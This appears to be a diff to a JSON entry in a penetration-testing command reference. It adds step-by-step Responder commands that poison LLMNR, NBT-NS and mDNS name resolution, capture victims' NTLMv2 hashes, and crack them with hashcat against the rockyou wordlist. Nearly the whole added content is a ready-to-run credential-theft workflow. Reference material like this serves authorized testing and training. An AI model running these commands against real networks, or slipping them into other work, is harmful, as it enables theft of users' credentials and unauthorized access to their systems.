@@ -85,5 +85,29 @@
   },
   "tools": [
     "Responder"
+  ],
+  "variations": [
+    {
+      "label": "Analyze-only (no poisoning)",
+      "command": "sudo responder -I <interface> -A"
+    },
+    {
+      "label": "With WPAD + verbose",
+      "command": "sudo responder -I <interface> -wv"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Start poisoning LLMNR/NBT-NS/MDNS",
+      "command": "sudo responder -I <interface>"
+    },
+    {
+      "label": "Capture NTLMv2 hashes as victims resolve names",
+      "command": "# hashes land in /usr/share/responder/logs/"
+    },
+    {
+      "label": "Crack them",
+      "command": "hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt"
+    }
   ]
 }
